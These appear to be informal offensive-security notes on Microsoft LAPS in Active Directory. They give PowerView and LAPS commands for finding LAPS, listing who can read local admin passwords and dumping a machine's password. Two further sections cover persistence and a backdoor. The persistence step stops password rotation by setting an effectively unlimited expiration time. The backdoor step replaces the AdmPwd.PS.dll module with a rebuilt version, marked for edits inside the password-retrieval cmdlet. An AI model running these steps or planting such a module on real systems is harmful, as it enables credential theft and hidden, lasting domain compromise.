local administrator password solution is a .msi you install 
you can install the service and the tools that mange in the powershell like `Get-AdmPwdPassword` 
so when you install it in the DC it adds two new properties to computer objects, called `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime`.

check if there is LAPS or not by 
```powershell 
ls "C:\Program Files\LAPS\CSE"
# GPO
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

Get-DomainObject -SearchBase "LDAP://DC=forest,DC=lab" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
# Acl 
Get-DomainObjectAcl -SearchBase "LDAP://DC=forest,DC=lab" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier
```

of course if you are domain admin you can read this passwords: 
```powershell
Get-AdmPwdPassword -ComputerName "wkstn-2"
```


# persistance 
extend the experation time to be unlimted
```powershell
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```


# backdoor 
the powershell moduel in `C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\`
since you can found the code [here](https://github.com/GreyCorbel/admpwd) you can edit the code and replace the file `AdmPwd.PS.dll`


Main/AdmPwd.PS/Main.cs
```powershell
[Cmdlet("Get", "AdmPwdPassword")]
public class GetPassword : Cmdlet
{
    [Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]
    public String ComputerName;

    protected override void ProcessRecord()
    {
        foreach (string dn in DirectoryUtils.GetComputerDN(ComputerName))
        {
            PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);
            ## EDIT HERE ;)
            WriteObject(pi);
        }
    }
}

